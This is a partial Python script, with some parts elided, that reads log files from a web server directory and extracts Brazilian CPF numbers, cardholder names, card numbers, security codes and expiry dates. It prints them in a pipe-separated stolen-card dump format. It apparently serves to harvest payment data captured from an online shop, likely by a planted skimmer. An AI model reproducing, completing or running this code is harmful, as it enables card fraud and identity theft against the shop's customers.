...
try:
    ...
    print("you need to speicfy location eg: filter.py /var/www/logs")
    exit()
...
def checkforLog(path):
    f = open(path, "r")
    lines = bytes(f.read().encode('cp1252','ignore'))

    output = unserialize(lines)
    output = {
        key.decode(): val.decode() if isinstance(val, bytes) else val
        for key, val in output.items()
    }
    cpf = output['Pedido'][b'cpf'].decode('utf-8')
    cardType = output['Pagamento'][b'forma'].decode('utf-8')
    cardName = output['Pagamento'][b'name'].decode('utf-8')
    cardNumber = output['Pagamento'][b'card_number'].decode('utf-8')
    cardSecurity = output['Pagamento'][b'security_code'].decode('utf-8')
    cardMonth = output['Pagamento'][b'month'].decode('utf-8')
    cardYear = output['Pagamento'][b'year'].decode('utf-8')

    print(f"{cpf}|{cardType}|{cardName}|{cardNumber}|{cardSecurity}|{cardMonth}/{cardYear}")
